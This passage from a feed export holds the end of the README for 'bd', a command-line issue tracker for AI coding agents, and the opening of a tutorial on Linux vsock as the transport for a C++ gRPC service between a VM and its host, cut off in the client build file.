bd --no-auto-import list            # Skip auto-import check&lt;/code&gt;
    &lt;p&gt;Version 0.20.1 introduces collision-resistant hash-based IDs to enable reliable multi-worker and multi-branch workflows.&lt;/p&gt;
    &lt;p&gt;Issue IDs now use short hexadecimal hashes instead of sequential numbers:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Before (v0.20.0): &lt;code&gt;bd-1&lt;/code&gt;,&lt;code&gt;bd-2&lt;/code&gt;,&lt;code&gt;bd-152&lt;/code&gt;(sequential numbers)&lt;/item&gt;
      &lt;item&gt;After (v0.20.1): &lt;code&gt;bd-a1b2&lt;/code&gt;,&lt;code&gt;bd-f14c&lt;/code&gt;,&lt;code&gt;bd-3e7a&lt;/code&gt;(4-6 character hashes)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Hash IDs use progressive length scaling based on database size:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;0-500 issues: 4-character hashes (e.g., &lt;code&gt;bd-a1b2&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;500-1,500 issues: 5-character hashes (e.g., &lt;code&gt;bd-f14c3&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;1,500-10,000 issues: 6-character hashes (e.g., &lt;code&gt;bd-3e7a5b&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The problem with sequential IDs: When multiple agents or branches create issues concurrently, sequential IDs collide:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Agent A creates &lt;code&gt;bd-10&lt;/code&gt;on branch&lt;code&gt;feature-auth&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Agent B creates &lt;code&gt;bd-10&lt;/code&gt;on branch&lt;code&gt;feature-payments&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Git merge creates duplicate IDs → collision resolution required&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How hash IDs solve this: Hash IDs are generated from random data, making concurrent creation collision-free:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Agent A creates &lt;code&gt;bd-a1b2&lt;/code&gt;(hash of random UUID)&lt;/item&gt;
      &lt;item&gt;Agent B creates &lt;code&gt;bd-f14c&lt;/code&gt;(different hash, different UUID)&lt;/item&gt;
      &lt;item&gt;Git merge succeeds cleanly → no collision resolution needed&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Hash IDs use birthday paradox probability to determine length:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Hash Length&lt;/cell&gt;
        &lt;cell role="head"&gt;Total Space&lt;/cell&gt;
        &lt;cell role="head"&gt;50% Collision at N Issues&lt;/cell&gt;
        &lt;cell role="head"&gt;1% Collision at N Issues&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;4 chars&lt;/cell&gt;
        &lt;cell&gt;65,536&lt;/cell&gt;
        &lt;cell&gt;~304 issues&lt;/cell&gt;
        &lt;cell&gt;~38 issues&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;5 chars&lt;/cell&gt;
        &lt;cell&gt;1,048,576&lt;/cell&gt;
        &lt;cell&gt;~1,217 issues&lt;/cell&gt;
        &lt;cell&gt;~153 issues&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;6 chars&lt;/cell&gt;
        &lt;cell&gt;16,777,216&lt;/cell&gt;
        &lt;cell&gt;~4,869 issues&lt;/cell&gt;
        &lt;cell&gt;~612 issues&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Our thresholds are conservative: We switch from 4→5 chars at 500 issues (way before the 1% collision point at ~1,217) and from 5→6 chars at 1,500 issues.&lt;/p&gt;
    &lt;p&gt;Progressive extension on collision: If a hash collision does occur, bd automatically extends the hash to 7 or 8 characters instead of remapping to a new ID.&lt;/p&gt;
    &lt;p&gt;Existing databases continue to work - no forced migration. Run &lt;code&gt;bd migrate&lt;/code&gt; when ready:&lt;/p&gt;
    &lt;code&gt;# Inspect migration plan (for AI agents)
bd migrate --inspect --json

# Check schema and config state
bd info --schema --json

# Preview migration
bd migrate --dry-run

# Migrate database schema (removes obsolete issue_counters table)
bd migrate

# Show current database info
bd info&lt;/code&gt;
    &lt;p&gt;AI-supervised migrations: The &lt;code&gt;--inspect&lt;/code&gt; flag provides migration plan analysis for AI agents. The system verifies data integrity invariants (required config keys, foreign key constraints, issue counts) before committing migrations.&lt;/p&gt;
    &lt;p&gt;Note: Hash IDs require schema version 9+. The &lt;code&gt;bd migrate&lt;/code&gt; command detects old schemas and upgrades automatically.&lt;/p&gt;
    &lt;p&gt;Hash IDs support hierarchical children for natural work breakdown structures. Child IDs use dot notation:&lt;/p&gt;
    &lt;code&gt;bd-a3f8e9      [epic] Auth System
bd-a3f8e9.1    [task] Design login UI
bd-a3f8e9.2    [task] Backend validation
bd-a3f8e9.3    [epic] Password Reset
bd-a3f8e9.3.1  [task] Email templates
bd-a3f8e9.3.2  [task] Reset flow tests
&lt;/code&gt;
    &lt;p&gt;Benefits:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Collision-free: Parent hash ensures unique namespace&lt;/item&gt;
      &lt;item&gt;Human-readable: Clear parent-child relationships&lt;/item&gt;
      &lt;item&gt;Flexible depth: Up to 3 levels of nesting&lt;/item&gt;
      &lt;item&gt;No coordination needed: Each epic owns its child ID space&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Common patterns:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;1 level: Epic → tasks (most projects)&lt;/item&gt;
      &lt;item&gt;2 levels: Epic → features → tasks (large projects)&lt;/item&gt;
      &lt;item&gt;3 levels: Epic → features → stories → tasks (complex projects)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Example workflow:&lt;/p&gt;
    &lt;code&gt;# Create parent epic (generates hash ID automatically)
bd create "Auth System" -t epic -p 1
# Returns: bd-a3f8e9

# Create child tasks
bd create "Design login UI" -p 1       # Auto-assigned: bd-a3f8e9.1
bd create "Backend validation" -p 1    # Auto-assigned: bd-a3f8e9.2

# Create nested epic with its own children
bd create "Password Reset" -t epic -p 1  # Auto-assigned: bd-a3f8e9.3
bd create "Email templates" -p 1          # Auto-assigned: bd-a3f8e9.3.1&lt;/code&gt;
    &lt;p&gt;Note: Child IDs are automatically assigned sequentially within each parent's namespace. No need to specify parent manually - bd tracks context from git branch/working directory.&lt;/p&gt;
    &lt;p&gt;Check installation health: &lt;code&gt;bd doctor&lt;/code&gt; validates your &lt;code&gt;.beads/&lt;/code&gt; setup, database version, ID format, and CLI version. Provides actionable fixes for any issues found.&lt;/p&gt;
    &lt;code&gt;bd create "Fix bug" -d "Description" -p 1 -t bug
bd create "Add feature" --description "Long description" --priority 2 --type feature
bd create "Task" -l "backend,urgent" --assignee alice

# Get JSON output for programmatic use
bd create "Fix bug" -d "Description" --json

# Create from templates (built-in: epic, bug, feature)
bd create --from-template epic "Q4 Platform Improvements"
bd create --from-template bug "Auth token validation fails"
bd create --from-template feature "Add OAuth support"

# Override template defaults
bd create --from-template bug "Critical issue" -p 0  # Override priority

# Create multiple issues from a markdown file
bd create -f feature-plan.md&lt;/code&gt;
    &lt;p&gt;Options:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;-f, --file&lt;/code&gt;- Create multiple issues from markdown file&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--from-template&lt;/code&gt;- Use template (epic, bug, feature, or custom)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-d, --description&lt;/code&gt;- Issue description&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-p, --priority&lt;/code&gt;- Priority (0-4, 0=highest, default=2)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-t, --type&lt;/code&gt;- Type (bug|feature|task|epic|chore, default=task)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-a, --assignee&lt;/code&gt;- Assign to user&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;-l, --labels&lt;/code&gt;- Comma-separated labels&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--id&lt;/code&gt;- Explicit issue ID (e.g.,&lt;code&gt;worker1-100&lt;/code&gt;for ID space partitioning)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;--json&lt;/code&gt;- Output in JSON format&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See &lt;code&gt;bd template list&lt;/code&gt; for available templates and &lt;code&gt;bd help template&lt;/code&gt; for managing custom templates.&lt;/p&gt;
    &lt;code&gt;bd info                                    # Show database path and daemon status
bd show bd-a1b2                            # Show full details
bd list                                    # List all issues
bd list --status open                      # Filter by status
bd list --priority 1                       # Filter by priority
bd list --assignee alice                   # Filter by assignee
bd list --label=backend,urgent             # Filter by labels (AND)
bd list --label-any=frontend,backend       # Filter by labels (OR)

# Advanced filters
bd list --title-contains "auth"            # Search title
bd list --desc-contains "implement"        # Search description
bd list --notes-contains "TODO"            # Search notes
bd list --id bd-123,bd-456                 # Specific IDs (comma-separated)

# Date range filters (YYYY-MM-DD or RFC3339)
bd list --created-after 2024-01-01         # Created after date
bd list --created-before 2024-12-31        # Created before date
bd list --updated-after 2024-06-01         # Updated after date
bd list --updated-before 2024-12-31        # Updated before date
bd list --closed-after 2024-01-01          # Closed after date
bd list --closed-before 2024-12-31         # Closed before date

# Empty/null checks
bd list --empty-description                # Issues with no description
bd list --no-assignee                      # Unassigned issues
bd list --no-labels                        # Issues with no labels

# Priority ranges
bd list --priority-min 0 --priority-max 1  # P0 and P1 only
bd list --priority-min 2                   # P2 and below

# Combine multiple filters
bd list --status open --priority 1 --label-any urgent,critical --no-assignee

# JSON output for agents
bd info --json
bd list --json
bd show bd-a1b2 --json&lt;/code&gt;
    &lt;code&gt;bd update bd-a1b2 --status in_progress
bd update bd-a1b2 --priority 2
bd update bd-a1b2 --assignee bob
bd close bd-a1b2 --reason "Completed"
bd close bd-a1b2 bd-f14c bd-3e7a   # Close multiple

# JSON output
bd update bd-a1b2 --status in_progress --json&lt;/code&gt;
    &lt;code&gt;# Add dependency (bd-f14c depends on bd-a1b2)
bd dep add bd-f14c bd-a1b2
bd dep add bd-3e7a bd-a1b2 --type blocks

# Remove dependency
bd dep remove bd-f14c bd-a1b2

# Show dependency tree
bd dep tree bd-f14c

# Detect cycles
bd dep cycles&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;blocks: Hard blocker (default) - issue cannot start until blocker is resolved&lt;/item&gt;
      &lt;item&gt;related: Soft relationship - issues are connected but not blocking&lt;/item&gt;
      &lt;item&gt;parent-child: Hierarchical relationship (child depends on parent)&lt;/item&gt;
      &lt;item&gt;discovered-from: Issue discovered during work on another issue (automatically inherits parent's &lt;code&gt;source_repo&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Only &lt;code&gt;blocks&lt;/code&gt; dependencies affect ready work detection.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Note: Issues created with&lt;/p&gt;&lt;code&gt;discovered-from&lt;/code&gt;dependencies automatically inherit the parent's&lt;code&gt;source_repo&lt;/code&gt;field, ensuring discovered work stays in the same repository as the parent task.&lt;/quote&gt;
    &lt;code&gt;# Show ready work (no blockers)
bd ready
bd ready --limit 20
bd ready --priority 1
bd ready --assignee alice

# Sort policies (hybrid is default)
bd ready --sort priority    # Strict priority order (P0, P1, P2, P3)
bd ready --sort oldest      # Oldest issues first (backlog clearing)
bd ready --sort hybrid      # Recent by priority, old by age (default)

# Show blocked issues
bd blocked

# Statistics
bd stats

# JSON output for agents
bd ready --json&lt;/code&gt;
    &lt;p&gt;Add flexible metadata to issues for filtering and organization:&lt;/p&gt;
    &lt;code&gt;# Add labels during creation
bd create "Fix auth bug" -t bug -p 1 -l auth,backend,urgent

# Add/remove labels
bd label add bd-a1b2 security
bd label remove bd-a1b2 urgent

# List labels
bd label list bd-a1b2            # Labels on one issue
bd label list-all                # All labels with counts

# Filter by labels
bd list --label backend,auth     # AND: must have ALL labels
bd list --label-any frontend,ui  # OR: must have AT LEAST ONE&lt;/code&gt;
    &lt;p&gt;See docs/LABELS.md for complete label documentation and best practices.&lt;/p&gt;
    &lt;code&gt;# Single issue deletion (preview mode)
bd delete bd-a1b2

# Force single deletion
bd delete bd-a1b2 --force

# Batch deletion
bd delete bd-a1b2 bd-f14c bd-3e7a --force

# Delete from file (one ID per line)
bd delete --from-file deletions.txt --force

# Cascade deletion (recursively delete dependents)
bd delete bd-a1b2 --cascade --force&lt;/code&gt;
    &lt;p&gt;The delete operation removes all dependency links, updates text references to &lt;code&gt;[deleted:ID]&lt;/code&gt;, and removes the issue from database and JSONL.&lt;/p&gt;
    &lt;p&gt;Manage per-project configuration for external integrations:&lt;/p&gt;
    &lt;code&gt;# Set configuration
bd config set jira.url "https://company.atlassian.net"
bd config set jira.project "PROJ"

# Get configuration
bd config get jira.url

# List all configuration
bd config list --json

# Unset configuration
bd config unset jira.url&lt;/code&gt;
    &lt;p&gt;See docs/CONFIG.md for complete configuration documentation.&lt;/p&gt;
    &lt;p&gt;Beads provides agent-driven compaction - your AI agent decides what to compress, no API keys required:&lt;/p&gt;
    &lt;code&gt;# Agent-driven workflow (recommended)
bd compact --analyze --json              # Get candidates with full content
bd compact --apply --id bd-42 --summary summary.txt

# Legacy AI-powered workflow (requires ANTHROPIC_API_KEY)
bd compact --auto --dry-run --all        # Preview candidates
bd compact --auto --all                  # Auto-compact all eligible issues&lt;/code&gt;
    &lt;p&gt;How it works:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Use &lt;code&gt;--analyze&lt;/code&gt;to export candidates (closed 30+ days) with full content&lt;/item&gt;
      &lt;item&gt;Summarize the content using any LLM (Claude, GPT, local model, etc.)&lt;/item&gt;
      &lt;item&gt;Use &lt;code&gt;--apply&lt;/code&gt;to persist the summary and mark as compacted&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This is agentic memory decay - your database naturally forgets fine-grained details while preserving essential context. The agent has full control over compression quality.&lt;/p&gt;
    &lt;code&gt;# Export to JSONL (automatic by default)
bd export -o issues.jsonl

# Import from JSONL (automatic when JSONL is newer)
bd import -i issues.jsonl

# Handle missing parents during import
bd import -i issues.jsonl --orphan-handling resurrect  # Auto-recreate deleted parents
bd import -i issues.jsonl --orphan-handling skip       # Skip orphans with warning
bd import -i issues.jsonl --orphan-handling strict     # Fail on missing parents

# Manual sync
bd sync&lt;/code&gt;
    &lt;p&gt;Import Orphan Handling:&lt;/p&gt;
    &lt;p&gt;When importing hierarchical issues (e.g., &lt;code&gt;bd-abc.1&lt;/code&gt;, &lt;code&gt;bd-abc.2&lt;/code&gt;), bd needs to handle cases where the parent (&lt;code&gt;bd-abc&lt;/code&gt;) has been deleted:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;allow&lt;/code&gt;(default) - Import orphans without validation. Most permissive, ensures no data loss.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;resurrect&lt;/code&gt;- Search JSONL history for deleted parents and recreate them as tombstones (Status=Closed, Priority=4). Preserves hierarchy.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;skip&lt;/code&gt;- Skip orphaned children with warning. Partial import.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;strict&lt;/code&gt;- Fail import if parent is missing.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Configure default behavior: &lt;code&gt;bd config set import.orphan_handling resurrect&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;See docs/CONFIG.md for complete configuration documentation.&lt;/p&gt;
    &lt;p&gt;Note: Auto-sync is enabled by default. Manual export/import is rarely needed.&lt;/p&gt;
    &lt;p&gt;bd runs a background daemon per workspace for auto-sync and RPC operations. Use &lt;code&gt;bd daemons&lt;/code&gt; to manage multiple daemons:&lt;/p&gt;
    &lt;code&gt;# List all running daemons
bd daemons list

# Check health (version mismatches, stale sockets)
bd daemons health

# Stop a specific daemon
bd daemons stop /path/to/workspace
bd daemons stop 12345  # By PID

# Restart a specific daemon
bd daemons restart /path/to/workspace
bd daemons restart 12345  # By PID

# View daemon logs
bd daemons logs /path/to/workspace -n 100
bd daemons logs 12345 -f  # Follow mode

# Stop all daemons
bd daemons killall
bd daemons killall --force  # Force kill if graceful fails&lt;/code&gt;
    &lt;p&gt;Common use cases:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;After upgrading bd: Run &lt;code&gt;bd daemons health&lt;/code&gt;to check for version mismatches, then&lt;code&gt;bd daemons killall&lt;/code&gt;to restart all daemons with the new version&lt;/item&gt;
      &lt;item&gt;Debugging: Use &lt;code&gt;bd daemons logs &amp;lt;workspace&amp;gt;&lt;/code&gt;to view daemon logs&lt;/item&gt;
      &lt;item&gt;Cleanup: &lt;code&gt;bd daemons list&lt;/code&gt;auto-removes stale sockets&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See commands/daemons.md for complete documentation.&lt;/p&gt;
    &lt;p&gt;A standalone web interface for real-time issue monitoring is available as an example:&lt;/p&gt;
    &lt;code&gt;# Build the monitor-webui
cd examples/monitor-webui
go build

# Start web UI on localhost:8080
./monitor-webui

# Custom port and host
./monitor-webui -port 3000
./monitor-webui -host 0.0.0.0 -port 8080  # Listen on all interfaces&lt;/code&gt;
    &lt;p&gt;The monitor provides:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Real-time table view of all issues with filtering by status and priority&lt;/item&gt;
      &lt;item&gt;Click-through details - Click any issue to view full details in a modal&lt;/item&gt;
      &lt;item&gt;Live updates - WebSocket connection for real-time changes via daemon RPC&lt;/item&gt;
      &lt;item&gt;Responsive design - Mobile-friendly card view on small screens&lt;/item&gt;
      &lt;item&gt;Statistics dashboard - Quick overview of issue counts and ready work&lt;/item&gt;
      &lt;item&gt;Clean UI - Simple, fast interface styled with milligram.css&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The monitor is particularly useful for:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Team visibility - Share a dashboard view of project status&lt;/item&gt;
      &lt;item&gt;AI agent supervision - Watch your coding agent create and update issues in real-time&lt;/item&gt;
      &lt;item&gt;Quick browsing - Faster than CLI for exploring issue details&lt;/item&gt;
      &lt;item&gt;Mobile access - Check project status from your phone&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See examples/monitor-webui/ for complete documentation.&lt;/p&gt;
    &lt;p&gt;Check out the examples/ directory for:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Python agent - Full agent implementation in Python&lt;/item&gt;
      &lt;item&gt;Bash agent - Shell script agent example&lt;/item&gt;
      &lt;item&gt;Git hooks - Automatic export/import on git operations&lt;/item&gt;
      &lt;item&gt;Branch merge workflow - Handle ID collisions when merging branches&lt;/item&gt;
      &lt;item&gt;Claude Desktop MCP - MCP server for Claude Desktop&lt;/item&gt;
      &lt;item&gt;Claude Code Plugin - One-command installation with slash commands&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For advanced usage, see:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;docs/ADVANCED.md - Prefix renaming, merging duplicates, daemon configuration&lt;/item&gt;
      &lt;item&gt;docs/CONFIG.md - Configuration system for integrations&lt;/item&gt;
      &lt;item&gt;docs/EXTENDING.md - Database extension patterns&lt;/item&gt;
      &lt;item&gt;docs/ADVANCED.md - JSONL format and merge strategies&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;README.md - You are here! Core features and quick start&lt;/item&gt;
      &lt;item&gt;docs/INSTALLING.md - Complete installation guide for all platforms&lt;/item&gt;
      &lt;item&gt;docs/QUICKSTART.md - Interactive tutorial (&lt;code&gt;bd quickstart&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;docs/AGENT_MAIL_QUICKSTART.md - 5-minute Agent Mail setup guide&lt;/item&gt;
      &lt;item&gt;docs/AGENT_MAIL.md - Complete Agent Mail integration guide&lt;/item&gt;
      &lt;item&gt;docs/MULTI_REPO_MIGRATION.md - Multi-repo workflow guide (OSS, teams, multi-phase)&lt;/item&gt;
      &lt;item&gt;docs/MULTI_REPO_AGENTS.md - Multi-repo patterns for AI agents&lt;/item&gt;
      &lt;item&gt;docs/FAQ.md - Frequently asked questions&lt;/item&gt;
      &lt;item&gt;docs/TROUBLESHOOTING.md - Common issues and solutions&lt;/item&gt;
      &lt;item&gt;docs/ADVANCED.md - Advanced features and use cases&lt;/item&gt;
      &lt;item&gt;docs/LABELS.md - Complete label system guide&lt;/item&gt;
      &lt;item&gt;docs/CONFIG.md - Configuration system&lt;/item&gt;
      &lt;item&gt;docs/EXTENDING.md - Database extension patterns&lt;/item&gt;
      &lt;item&gt;docs/ADVANCED.md - JSONL format analysis&lt;/item&gt;
      &lt;item&gt;docs/PLUGIN.md - Claude Code plugin documentation&lt;/item&gt;
      &lt;item&gt;CONTRIBUTING.md - Contribution guidelines&lt;/item&gt;
      &lt;item&gt;SECURITY.md - Security policy&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;beads-ui - Local web interface with live updates, kanban board, and keyboard navigation. Zero-setup launch with &lt;code&gt;npx beads-ui start&lt;/code&gt;. Built by @mantoni.&lt;/item&gt;
      &lt;item&gt;bdui - Real-time terminal UI with kanban board, tree view, dependency graph, and statistics dashboard. Vim-style navigation, search/filter, themes, and native notifications. Built by @assimelha.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Have you built something cool with bd? Open an issue to get it featured here!&lt;/p&gt;
    &lt;code&gt;# Run tests
go test ./...

# Build
go build -o bd ./cmd/bd

# Run
./bd create "Test issue"

# Bump version
./scripts/bump-version.sh 0.9.3           # Update all versions, show diff
./scripts/bump-version.sh 0.9.3 --commit  # Update and auto-commit&lt;/code&gt;
    &lt;p&gt;See scripts/README.md for more development scripts.&lt;/p&gt;
    &lt;p&gt;MIT&lt;/p&gt;
    &lt;p&gt;Built with ❤️ by developers who love tracking dependencies and finding ready work.&lt;/p&gt;
    &lt;p&gt;Inspired by the need for a simpler, dependency-aware issue tracker.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/steveyegge/beads"/><published>2025-11-28T04:50:57+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075746</id><title>How to use Linux vsock for fast VM communication</title><updated>2025-11-28T11:33:51.540451+00:00</updated><content>&lt;doc fingerprint="8f8d591d4d436ea4"&gt;
  &lt;main&gt;
    &lt;p&gt;I’ve recently been experimenting with various ways to construct Linux VM images, but for these images to be practical, they need to interact with the outside world. At a minimum, they need to communicate with the host machine.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;vsock&lt;/code&gt; is a technology specifically designed with VMs in mind. It eliminates the need for a TCP/IP stack or network virtualization to enable communication with or between VMs. At the API level, it behaves like a standard socket but utilizes a specialized addressing scheme.&lt;/p&gt;
    &lt;p&gt;In the experiment below, we’ll explore using &lt;code&gt;vsock&lt;/code&gt; as the transport mechanism for a gRPC service running on a VM. We’ll build this project with Bazel for easy reproducibility. Check out this post if you need an intro to Bazel.&lt;/p&gt;
    &lt;head rend="h2"&gt;Table of contents&lt;/head&gt;
    &lt;head&gt;Open Table of contents&lt;/head&gt;
    &lt;head rend="h2"&gt;Motivation&lt;/head&gt;
    &lt;p&gt;There are many use cases for efficient communication between a VM and its host (or between multiple VMs). One simple reason is to create a hermetic environment within the VM and issue commands via RPC from the host. This is the primary driver for using gRPC in this example, but you can easily generalize the approach shown here to build far more complex systems.&lt;/p&gt;
    &lt;head rend="h2"&gt;GitHub repo&lt;/head&gt;
    &lt;p&gt;The complete repository is hosted here and serves as the source of truth for this experiment. While there may be minor inconsistencies between the code blocks below and the repository, please rely on GitHub as the definitive source.&lt;/p&gt;
    &lt;head rend="h2"&gt;Code breakdown&lt;/head&gt;
    &lt;p&gt;Let’s break down the code step by step:&lt;/p&gt;
    &lt;head rend="h3"&gt;External dependencies&lt;/head&gt;
    &lt;p&gt;Here are the external dependencies listed as Bazel modules:&lt;/p&gt;
    &lt;code&gt;bazel_dep(name = "rules_proto", version = "7.1.0")
bazel_dep(name = "rules_cc", version = "0.2.14")
bazel_dep(name = "protobuf", version = "33.1", repo_name = "com_google_protobuf")
bazel_dep(name = "grpc", version = "1.76.0.bcr.1")&lt;/code&gt;
    &lt;p&gt;This is largely self-explanatory. The &lt;code&gt;protobuf&lt;/code&gt; repository is used for C++ proto-generation rules, and &lt;code&gt;grpc&lt;/code&gt; provides the monorepo for Bazel rules to generate gRPC code for the C++ family of languages.&lt;/p&gt;
    &lt;head rend="h3"&gt;gRPC library generation&lt;/head&gt;
    &lt;p&gt;The following Bazel targets generate the necessary C++ Protobuf and gRPC libraries:&lt;/p&gt;
    &lt;code&gt;load("@rules_proto//proto:defs.bzl", "proto_library")
load("@com_google_protobuf//bazel:cc_proto_library.bzl", "cc_proto_library")
load("@grpc//bazel:cc_grpc_library.bzl", "cc_grpc_library")

proto_library(
    name = "vsock_service_proto",
    srcs = ["vsock_service.proto"],
)

cc_proto_library(
    name = "vsock_service_cc_proto",
    deps = [
        ":vsock_service_proto",
    ],
    visibility = [
        "//server:__subpackages__",
        "//client:__subpackages__",
    ],
)

cc_grpc_library(
    name = "vsock_service_cc_grpc",
    grpc_only = True,
    srcs = [
        ":vsock_service_proto",
    ],
    deps = [
        ":vsock_service_cc_proto",
    ],
    visibility = [
        "//server:__subpackages__",
        "//client:__subpackages__",
    ],
)&lt;/code&gt;
    &lt;p&gt;The protocol definition is straightforward:&lt;/p&gt;
    &lt;code&gt;syntax = "proto3";

package popovicu_vsock;

service VsockService {
  rpc Addition(AdditionRequest) returns (AdditionResponse) {}
}

message AdditionRequest {
  int32 a = 1;
  int32 b = 2;
}

message AdditionResponse {
  int32 c = 1;
}&lt;/code&gt;
    &lt;p&gt;It simply exposes a service capable of adding two integers.&lt;/p&gt;
    &lt;head rend="h3"&gt;Server implementation&lt;/head&gt;
    &lt;p&gt;The &lt;code&gt;BUILD&lt;/code&gt; file is straightforward:&lt;/p&gt;
    &lt;code&gt;load("@rules_cc//cc:defs.bzl", "cc_binary")

cc_binary(
    name = "server",
    srcs = [
        "server.cc",
    ],
    deps = [
        "@grpc//:grpc++",
        "//proto:vsock_service_cc_grpc",
        "//proto:vsock_service_cc_proto",
    ],
    linkstatic = True,
    linkopts = [
        "-static",
    ],
)&lt;/code&gt;
    &lt;p&gt;We want a statically linked binary to run on the VM. This choice simplifies deployment, allowing us to drop a single file onto the VM.&lt;/p&gt;
    &lt;p&gt;The code is largely self-explanatory:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;memory&amp;gt;
#include &amp;lt;string&amp;gt;

#include &amp;lt;grpc++/grpc++.h&amp;gt;
#include "proto/vsock_service.grpc.pb.h"

using grpc::Server;
using grpc::ServerBuilder;
using grpc::ServerContext;
using grpc::Status;
using popovicu_vsock::VsockService;
using popovicu_vsock::AdditionRequest;
using popovicu_vsock::AdditionResponse;

// Service implementation
class VsockServiceImpl final : public VsockService::Service {
  Status Addition(ServerContext* context, const AdditionRequest* request,
                  AdditionResponse* response) override {
    int32_t result = request-&amp;gt;a() + request-&amp;gt;b();
    response-&amp;gt;set_c(result);
    std::cout &amp;lt;&amp;lt; "Addition: " &amp;lt;&amp;lt; request-&amp;gt;a() &amp;lt;&amp;lt; " + " &amp;lt;&amp;lt; request-&amp;gt;b()
              &amp;lt;&amp;lt; " = " &amp;lt;&amp;lt; result &amp;lt;&amp;lt; std::endl;
    return Status::OK;
  }
};

void RunServer() {
  // Server running on VM (guest)
  // vsock:-1:9999 means listen on port 9999, accept connections from any CID
  // CID -1 (VMADDR_CID_ANY) allows the host to connect to this VM server
  std::string server_address("vsock:3:9999");
  VsockServiceImpl service;

  ServerBuilder builder;
  builder.AddListeningPort(server_address, grpc::InsecureServerCredentials());
  builder.RegisterService(&amp;amp;service);

  std::unique_ptr&amp;lt;Server&amp;gt; server(builder.BuildAndStart());
  std::cout &amp;lt;&amp;lt; "Server listening on " &amp;lt;&amp;lt; server_address &amp;lt;&amp;lt; std::endl;

  server-&amp;gt;Wait();
}

int main() {
  RunServer();
  return 0;
}&lt;/code&gt;
    &lt;p&gt;The only part requiring explanation is the &lt;code&gt;server_address&lt;/code&gt;. The &lt;code&gt;vsock:&lt;/code&gt; prefix indicates that we’re using &lt;code&gt;vsock&lt;/code&gt; as the transport layer. gRPC supports various transports, including TCP/IP and Unix sockets.&lt;/p&gt;
    &lt;p&gt;The number &lt;code&gt;3&lt;/code&gt; is the CID, or Context ID. This functions similarly to an IP address. Certain CIDs have special meanings. For instance, CID 2 represents the VM host itself; if the VM needs to connect to a &lt;code&gt;vsock&lt;/code&gt; socket on the host, it targets CID 2. CID 1 is reserved for the loopback address. Generally, VMs are assigned CIDs starting from 3.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;9999&lt;/code&gt; is simply the port number, functioning just as it does in TCP/IP.&lt;/p&gt;
    &lt;head rend="h3"&gt;Client implementation&lt;/head&gt;
    &lt;p&gt;The &lt;code&gt;BUILD&lt;/code&gt; file is, again, quite simple:&lt;/p&gt;
    &lt;code&gt;load("@rules_cc//cc:defs.bzl", "cc_binary")

cc_binary(
    name = "client",
    srcs = [
        "client.cc",
    ],
    deps = [
        "@grpc//:grpc++",
